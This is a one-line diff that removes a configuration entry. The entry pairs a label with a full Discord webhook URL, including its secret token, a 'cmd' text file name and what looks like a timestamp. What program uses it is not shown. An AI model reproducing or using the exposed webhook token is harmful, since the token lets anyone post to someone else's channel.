@@ -1,1 +1,0 @@
-setup:BRONNERS-BABY:https://discord.com/api/webhooks/1562207181879771267/5mrv-_gXEmG8CUoUZ2xS7h7w6kwsu2h_4Pn2Y9p4mPzVWgP8T52r2iCR8a9CKpGeE9rP;cmd-bronners-baby.txt|1792529617
